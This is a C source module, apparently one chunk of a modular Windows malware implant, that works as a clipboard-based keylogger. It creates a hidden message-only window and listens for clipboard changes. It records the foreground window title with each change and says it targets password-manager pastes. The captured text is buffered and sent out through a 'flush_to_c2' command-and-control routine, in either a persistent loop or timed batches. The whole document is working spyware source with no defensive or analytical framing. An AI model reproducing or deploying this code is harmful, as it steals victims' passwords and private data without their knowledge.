// chunk: collectors/keylogger_clipboard
// depends: core/emit_buffer
// provides: poll_keys, flush_keylog, run_self_test, persistent_keylog, batch_keylog
// headers: windows.h
// note: Clipboard-only monitoring — catches password manager pastes, no keyboard hooks

#ifndef CHUNK_KEYLOGGER_CLIPBOARD
#define CHUNK_KEYLOGGER_CLIPBOARD

#ifndef FLUSH_INTERVAL_MS
#define FLUSH_INTERVAL_MS 30000
#endif

#ifndef BATCH_DURATION_MS
#define BATCH_DURATION_MS 30000
#endif

static char g_keylog_buf[32768];
static int  g_keylog_pos = 0;
static char g_last_window[256] = {0};
static volatile int g_clip_changed = 0;

static void flush_to_c2(void);

static void log_key(int vk) { (void)vk; }

static void poll_keys(void) {
    if (!g_clip_changed) return;
    g_clip_changed = 0;

    char wnd_title[256] = {0};
    HWND fg = GetForegroundWindow();
    if (fg) GetWindowTextA(fg, wnd_title, sizeof(wnd_title));
    if (wnd_title[0] && strcmp(wnd_title, g_last_window) != 0) {
        int n = snprintf(g_keylog_buf + g_keylog_pos,
                         sizeof(g_keylog_buf) - g_keylog_pos,
                         "\r\n[%s]\r\n", wnd_title);
        if (n > 0) g_keylog_pos += n;
        strncpy(g_last_window, wnd_title, sizeof(g_last_window) - 1);
    }

    if (!OpenClipboard(NULL)) return;
    HANDLE hd = GetClipboardData(CF_UNICODETEXT);
    if (hd) {
        WCHAR *wstr = (WCHAR *)GlobalLock(hd);
        if (wstr) {
            char mb[4096] = {0};
            int mbl = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, mb, sizeof(mb) - 1, NULL, NULL);
            GlobalUnlock(hd);
            if (mbl > 0 && g_keylog_pos + mbl + 32 < (int)sizeof(g_keylog_buf)) {
                int n = snprintf(g_keylog_buf + g_keylog_pos,
                                 sizeof(g_keylog_buf) - g_keylog_pos,
                                 "[CLIP:%s]", mb);
                if (n > 0) g_keylog_pos += n;
            }
        }
    }
    CloseClipboard();
}

static LRESULT CALLBACK clip_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CLIPBOARDUPDATE) {
        g_clip_changed = 1;
        return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

static void flush_keylog(void) {
    if (g_keylog_pos == 0) return;
    emitf("=== CLIPBOARD CAPTURE ===\r\n");
    emit(g_keylog_buf, (DWORD)g_keylog_pos);
    emitf("\r\n\r\n");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();
}

static int run_self_test(void) {
    int before = g_keylog_pos;
    if (OpenClipboard(NULL)) {
        EmptyClipboard();
        const char *test = "CLIPTEST";
        HGLOBAL hm = GlobalAlloc(GMEM_MOVEABLE, 32);
        if (hm) {
            WCHAR *p = (WCHAR *)GlobalLock(hm);
            if (p) {
                for (int i = 0; i < 8; i++) p[i] = (WCHAR)test[i];
                p[8] = 0;
                GlobalUnlock(hm);
                SetClipboardData(CF_UNICODETEXT, hm);
            }
        }
        CloseClipboard();
        Sleep(100);
        g_clip_changed = 1;
        poll_keys();
    }
    return (g_keylog_pos > before) ? 1 : 0;
}

static HWND clip_create_window(void) {
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = clip_wndproc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "ClipSink";
    RegisterClassA(&wc);
    HWND hwnd = CreateWindowExA(0, "ClipSink", NULL, 0, 0, 0, 0, 0,
                                 HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
    if (hwnd) {
        typedef BOOL (WINAPI *pfnAddClip)(HWND);
        pfnAddClip fn = (pfnAddClip)GetProcAddress(GetModuleHandleA("user32.dll"), "AddClipboardFormatListener");
        if (fn) fn(hwnd);
    }
    return hwnd;
}

static void persistent_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    HWND hwnd = clip_create_window();
    if (!hwnd) {
        emitf("=== KEYLOG STATUS ===\r\nHook: FAILED (clipboard)\r\n\r\n");
        return;
    }

    int self_test_ok = run_self_test();
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (mode=clipboard_persistent, self_test=%s)\r\n\r\n",
           self_test_ok ? "PASS" : "FAIL");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();

    DWORD last_flush = GetTickCount();
    MSG msg;
    for (;;) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        poll_keys();
        DWORD now = GetTickCount();
        if ((now - last_flush >= FLUSH_INTERVAL_MS && g_keylog_pos > 0) ||
            g_keylog_pos >= (int)sizeof(g_keylog_buf) - 256) {
            flush_keylog();
            last_flush = now;
        }
        Sleep(50);
    }
}

static void batch_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    HWND hwnd = clip_create_window();
    if (!hwnd) {
        emitf("=== KEYLOG STATUS ===\r\nHook: FAILED (clipboard)\r\n\r\n");
        return;
    }

    DWORD start = GetTickCount();
    MSG msg;
    while (GetTickCount() - start < (DWORD)(BATCH_DURATION_MS - 3000)) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        poll_keys();
        Sleep(50);
    }

    int self_test_ok = run_self_test();
    while (GetTickCount() - start < BATCH_DURATION_MS) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        poll_keys();
        Sleep(50);
    }

    DestroyWindow(hwnd);
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (duration=%dms, self_test=%s, keys=%d, method=clipboard)\r\n\r\n",
           BATCH_DURATION_MS, self_test_ok ? "PASS" : "FAIL", g_keylog_pos);
    if (g_keylog_pos > 0) {
        emitf("=== CLIPBOARD CAPTURE (%d ms) ===\r\n", BATCH_DURATION_MS);
        emit(g_keylog_buf, (DWORD)g_keylog_pos);
        emitf("\r\n\r\n");
    }
}

#endif
